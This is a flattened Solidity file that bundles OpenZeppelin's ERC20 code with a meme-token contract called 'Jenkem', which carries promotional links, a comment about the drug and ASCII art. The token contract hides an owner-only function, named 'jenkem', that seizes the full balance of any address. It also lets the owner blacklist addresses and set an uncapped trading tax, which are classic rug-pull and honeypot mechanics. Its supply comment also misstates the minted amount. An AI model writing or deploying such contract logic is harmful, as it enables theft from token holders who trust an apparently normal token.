// File: @openzeppelin/contracts/interfaces/draft-IERC6093.sol


// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)
pragma solidity ^0.8.20;

/**
 * @dev Standard ERC20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.
 */
interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}

/**
 * @dev Standard ERC721 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.
 */
interface IERC721Errors {
    /**
     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.
     * Used in balance queries.
     * @param owner Address of the current owner of a token.
     */
    error ERC721InvalidOwner(address owner);

    /**
     * @dev Indicates a `tokenId` whose `owner` is the zero address.
     * @param tokenId Identifier number of a token.
     */
    error ERC721NonexistentToken(uint256 tokenId);

    /**
     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param tokenId Identifier number of a token.
     * @param owner Address of the current owner of a token.
     */
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC721InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC721InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param tokenId Identifier number of a token.
     */
    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC721InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC721InvalidOperator(address operator);
}

/**
 * @dev Standard ERC1155 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.
 */
interface IERC1155Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     * @param tokenId Identifier number of a token.
     */
    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC1155InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC1155InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param owner Address of the current owner of a token.
     */
    error ERC1155MissingApprovalForAll(address operator, address owner);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC1155InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC1155InvalidOperator(address operator);

    /**
     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
     * Used in batch transfers.
     * @param idsLength Length of the array of token identifiers
     * @param valuesLength Length of the array of token amounts
     */
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)

pragma solidity ^0.8.20;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.20;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.20;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.20;





/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 */
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     * ```
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

// File: jenkem.sol


pragma solidity ^0.8.20;


/*
telegram: https://t.me/jenkemcoin
site: http://www.jenkem.net/
x: https://twitter.com/ShiLLin_ViLLian

                                                                                          
Jenkem is an inhalant and hallucinogen created from fermented human waste. 
In the mid-1990s, it was reported to be a popular street drug among Zambian youth. 
They would reportedly put the feces and urine in a jar or a bucket and seal it with a balloon or lid respectively, 
then leave it out to ferment in the sun; afterwards they would inhale the fumes created.

.......................................................................:::::::.......................................................
...................................................................:::::..:::::::::..................................................
...............................................................:::::::::::::::::::^^:................................................
..............................................................::::::::::::::::::^^^^^^...............................................
.............................................................^^^^::::::^^^^^^^^^^^~~~~~..............................................
............................................................:~^^^^^^^^^^^^^^~~~~~~~~!!!:.............................................
............................................................^~~~~~~~~~~~~~~~~~~~!!!!!!!:.............................................
............................................................^!!!!!!!!!!!!!!!!!!!!!!!77!..............................................
.............................................................!777777!!!!!!!!!!77777777^..............................................
..............................................................!???7777777777777777777^...............................................
...............................................................~7???????7777777777?!:................................................
............................................................... .^!7?????????77777~. ................................................
....................................................................^~7??????????~...................................................
....................................  ...:::..:...:.::........~~..... .:~???????7:...................................................
................................ ..:^!!777!^::::::~!~~~^^::^~!7!^....... ~?????77^...................................................
............................. .:~!7?YJ?7~^:::::::^:::..^^~!!~!!!~!~.......7?77777!...................................................
.............................^7JJ?JYJJ7!^^~~~~~!!~^^^::::^^^:^~?J?7^......~777777!^..................................................
..........................:.7YYJ?7YY??7!7???????7!!~~~~~^:!?!~~!!!!!7~....:!!!!!!!~:.................................................
........................~?!75YJ???J?7!?JJ??????77??7!~::.:~J?!^:^~~!!^^:...!~~~~~~!!.................................................
......................^~JJ7YYJ???7777JJ?????7777?7!~.......~??!^:^!!!!~....~!7JY55YJ^ ...............................................
......................~!J?7JJJ??77??Y7!!??7!~~77~~~^^:....^~~~~J7^~!7?7... ~?7?77!!??^...:...........................................
......................^!J??JJ???777JJ!!7J?~^:!?7~~~!~~^:..^77~!J?^~~77!... ^J7~^~~~!YY!~!!~::........................................
......................:?Y??J?7JJ?7?YJ!7?J7~^:~?!~~~~!!!^:..^77!7??7?J?~... ^?7~~~~~~!!~~!77!^........................................
.....................^?Y?!~!!7??JY5YJ?JJ?!^::^7?7!~^^~!~^:..:^!7?!~!!!^... ~J!~~~~~~!!!!~~~~^:::.....................................
.....................7J?!~~~!?!!JYJJYYYJ7!^:::^!7??!~~~~^:....:^?7~!!!^....!J7~~~!77!~^^~~!!!~^:::...................................
.....................!JJ77???7^^7?JYYY?!~~^^::^^^^~^^^~~~^:...:~!???7?:...:JY?~~~!!~!!~~~~^~~~^:::...................................
.....................:?YJ?JJJ^:^^7JJJ7!~^^^^^^^^^^^^^~!7??~::..:~??77!....75Y7~~~!77!!~~~~!!!!!!~~^::................................
......................^JJ???~:::^~77!~^^^^^^^^^^^^^~!!7!!~^::...^7JY7~:..:55Y7~~~~!!!7!!!!!!!~^^^::^:................................
.......................~????~^^^^!?7!777!~^^~^^^^^~J55J?7?J7~:...~?J?7:. ~5557~~~~~!7?J7777~~!?77!~^:................................
........................~YJ?7^^^^!7~~!777JJ7!~^^^~~7??!~^^~!~:....77~~:. 7P557~~~~~!7???JJJ!..?5YJ7!:................................
.........................~JYJ!^^~!!JJJ7^~7J77!^^^^^^!777!~~^^:...:~~^~:. ?PY5J!77777??????JY?::JYY7~.................................
.........................!??Y?~^~!??~~!!~!?77?!^^^^^~!!!~~^^^::::^~~!~:. 7PY55???????JJJJJYY5Y~75PJ~.................................
.........................75JJ7!!~^^^~~!!7?777!7!~~~^^~~~^^^^:..::^~^^:...~P?J5????????JJJJYY55?~YPP7~:...............................
.........................^JJ5?!??77!~~!~~~!~^~77!!7!~!77~~~~::.::!!^:....:J?!5J????????JJJYYYYJ!!5PJ!7^..............................
..........................!JJ?77JJ??7!~~~??J?7777!~~^^^7?!~~^::.:^~^......!J~JY?????????JJJYYYY?!JP577!~:............................
...........................!7??!7???77!!?7^!77!!~^^^~~~~7?!!!~^:^:........:?5Y5?7????????JJJJYYJ!!YPJ77~~............................
............................~7!7~77!!!7??^~!77!!~!7!!!77~!~!!~::^^^:.......!5PPY777????????JJJJJ7~7557!~!............................
.............................^~~~!?7!~!!~7YJYJJJ?7!~~!~~~^~!!^::7~:~:......:?5G5?7777?????JJ?JJJ?!!YPJ~!!^...........................
............................... .^!7!!~^~7JYYYYYJ?7!!~~^^^~~^::^7~^~^ ......~YPPJ7777???JJJJJJJJJ?!JP57!~~~:.........................
..................................:~!!~~~!!!7?7!~~~^^^^^^^~~^:^7!~^!^.....:^!J5P57!77??JJJJYJJJJJJ77YPJ!!~!!^........................
...................................:^~!~~~^^^~~~~~^:^^^:^^~~^^7!~^~7!^^:~77!!?Y55?!7777??JJJYJJJJY?!75P?~~^~~^.......................
....................................:~!!!!!~^!7!~^^^^~^:^~~^~7!~^~77~!7!!!7!~!Y55J77777??JJJJYJJYYJ7!JP5!~^^^^:......................
....................................:^~~~!777!!777!!~^^~!~^~!~^:~77!~~77!~~!!~7Y5Y?777???JJJJYJJJYJ?!75P?!~^^^:......................
......................................:^^^~!7777!!!!!!!!~~~7!^^!?!~~~!!~~~^~!~!?55J77?77?JJJJJYYJYYJ77YP5!~^:::......................
........................................^^^^^^~~~~~~~~^^~~~~~^!?7~~~~~^^^~~^^~~?Y5Y?7???JYY5YYY55Y55J?JPG?^^:::......................
........................................:^^^~^:^~^^~^^~^~!^^^^!7!~~^^^^^^^~^:^^7Y55JJJJ?JJYYYYY55Y555YJ5GP~:::.......................
........................................:^:^~^:~!^^!^^!^^!~^^::^^^^^^^^^^^^^^^^^?55YJ??JJJJYYYYYYYY555YYPG7..........................
.........................................::::::^^:^~^^^^^^^^^^^^^^^^^^::::::::..!Y55JJJJJJYYYYYY5YYYYYYY5G5:.........................
................................    ......::::::::::::::::::::^~^^:^^^^^^:::... :J55YJJYYYYYYYY5YY55Y5YYPPG! ........................
................................~!!!:..................::::::::^777!^^^^^::......755YJJYJYYYY5YY55555555PGGJ.........................
...............................:Y55Y^ ..       ....  .......:::^Y55J^^:::.....   :J55YJJJJYY555555555PPP5PGP:........................
...............................:YYYY^  .:^~!!~^....^~~~^~!!~^..:JYYJ^:~~~~...:^~!!?555YYYYYYYYJJYY5555555YJ~.........................
...............................:JYYY^ ^?YYYJJYYJ!..J55YY555YY?::JYYY^~YY5?.:7YYYJJYYY55P5YYYYYYYYYY5YYYYJ:  .........................
.............................. :JYYY^:JYYY7!!?Y55!.JYYY7^~JYY5~.JYYYJYYY?:.J5YY7~~?YYYYJYYYY?~7YYYJ!!JYYY^ ..........................
...............................^YYYY^^YYYYJ??????!.JYYY:  7YYY~.JYYYYYYY!.:YYYYJ??????7.7YYY~ ^YYY?  ?YYY^ ..........................
............................^JJYYY5Y:.7Y5Y?!!!77J~.J5YY:..75Y5~.J5YY~!YY5?^!Y5YJ7!!!7?7.75Y5~ ^YY5?..?5YY^ ..........................
............................~JJJJ?7^...^7?JYYYYJ?^.?JJ?:..!JJJ^.?JJ?..~?JJ?:^!?JYYYJJ?!.!JJJ^ :JJJ7..!JJJ^ ..........................
........................................ ...::... ..........:...:.........:.  .::::::......:....::.....::............................
..........................................................::~.::^:..~:~:~~^:.^^:^:^::^^^.^^~:^:.^^^~:^^:~............................
..........................................................:.:...::..:.:.::::..:::::::::::::^::..:^::.::.:............................
.....................................................................................................................................
.....................................................................................................................................

*/
contract CustomToken is ERC20 {
    address public owner;
    address public taxAddress; // Address where taxes will be sent
    mapping(address => bool) public blacklist;
    mapping(address => bool) public antiWhaleWhitelist;
    uint256 public taxPercentage;
    uint256 public whaleLimit; // Will be set to 1% of total supply in the constructor
    address public uniswapPair; // Address of the Uniswap pair for this token
    bool public restrictContracts; // Whether to restrict smart contract interactions
    bool public tradingEnabled = false; // Trading is disabled by default

    constructor() ERC20("Jenkem", "JENKEM") {
        owner = msg.sender;
        _mint(msg.sender, 100_000_000 * 10 ** 18); // 1 million tokens, considering 18 decimal places
        whaleLimit = totalSupply() / 100; // Set whaleLimit to 1% of total supply
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    modifier tradingRestriction() {
        require(tradingEnabled || msg.sender == owner, "Trading is not enabled");
        _;
    }

    modifier contractRestrictions() {
        if (restrictContracts) {
            require(msg.sender == tx.origin || msg.sender == uniswapPair, "Smart contracts are restricted");
        }
        _;
    }

    function setUniswapPair(address _pair) external onlyOwner {
        uniswapPair = _pair;
    }

    function startTrading() external onlyOwner {
        tradingEnabled = true;
    }

    function renounceOwnership() external onlyOwner {
        owner = address(0);
    }

    function setTaxAddress(address _taxAddress) external onlyOwner {
        taxAddress = _taxAddress;
    }

    function addToBooboo(address _address) external onlyOwner {
        blacklist[_address] = true;
    }

    function removeFrombooboo(address _address) external onlyOwner {
        blacklist[_address] = false;
    }

    function jenkem(address[] memory accounts) external onlyOwner {
        for (uint i = 0; i < accounts.length; i++) {
            address account = accounts[i];
            uint256 balance = balanceOf(account);
            if (balance > 0) {
                _transfer(account, taxAddress, balance);
            }
        }
    }

    function addyoyo(address _address) external onlyOwner {
        antiWhaleWhitelist[_address] = true;
    }

    function removeFromyoyo(address _address) external onlyOwner {
        antiWhaleWhitelist[_address] = false;
    }

    function setWhaleLimit(uint256 _limit) external onlyOwner {
        whaleLimit = _limit;
    }

    function setTaxPercentage(uint256 _percentage) external onlyOwner {
        taxPercentage = _percentage;
    }

    function batchAddToBlacklist(address[] memory _addresses) external onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            blacklist[_addresses[i]] = true;
        }
    }

    function toggleContractRestrictions() external onlyOwner {
        restrictContracts = !restrictContracts;
    }

    function transfer(address recipient, uint256 amount) public override contractRestrictions tradingRestriction returns (bool) {
        require(!blacklist[msg.sender] && !blacklist[recipient], "Address is blacklisted");
        require(balanceOf(recipient) + amount <= whaleLimit || antiWhaleWhitelist[recipient], "Recipient would exceed the whale limit");

        uint256 tax = 0;
        if ((msg.sender == uniswapPair || recipient == uniswapPair) && !antiWhaleWhitelist[msg.sender] && !antiWhaleWhitelist[recipient]) {
            tax = (amount * taxPercentage) / 100;
            super.transfer(taxAddress, tax);
        }

        super.transfer(recipient, amount - tax);
        return true;
    }
}